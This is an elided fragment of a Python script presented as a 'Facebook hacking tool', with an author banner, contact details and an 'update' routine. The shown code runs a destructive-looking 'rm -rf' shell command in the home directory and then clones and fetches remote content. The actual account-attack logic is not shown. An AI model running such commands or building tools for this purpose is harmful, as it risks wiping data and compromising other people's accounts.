...
"""+orange+white+"""
╔════════════════════════════════════════════════════════════════════╗
 ---E-T-H-I-C-A-L-H-A-C-R-O-F-B-D ---F-A-C-E-B-O-O-K---H-A-K-I-N-G---T-O-O-L-S--
╚════════════════════════════════════════════════════════════════════╝
  # Autho By CYBER SOJIB ETHICAL HACKER               
  # YouTube : CYBER SOJIB         
  # WhatsApp : +968 97894038           
  # Facebook: Mohammad sojib miah 
╔════════════════════════════════════════════════════════════════════╗"""
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
...
try:
	...
	token.close()
		...
		try:
			...
			print('   https://www.facebook.com/share/g/V9ShfNABUHd6XaKh/?mibextid=A7sQZp/⏺️')
...
def update():
	print("[🔴] update...")
	os.system('cd;rm -rf')
	os.system('cd;git clone https://github.com/Cybersojib12')
	exit()
...
if pilih == 2:
	...
	print("\n[🔵] Check for Updates")
	rr=requests.get('https://raw.githubusercontent.com/Cybersojib12.redmi.md.blood.txt').text
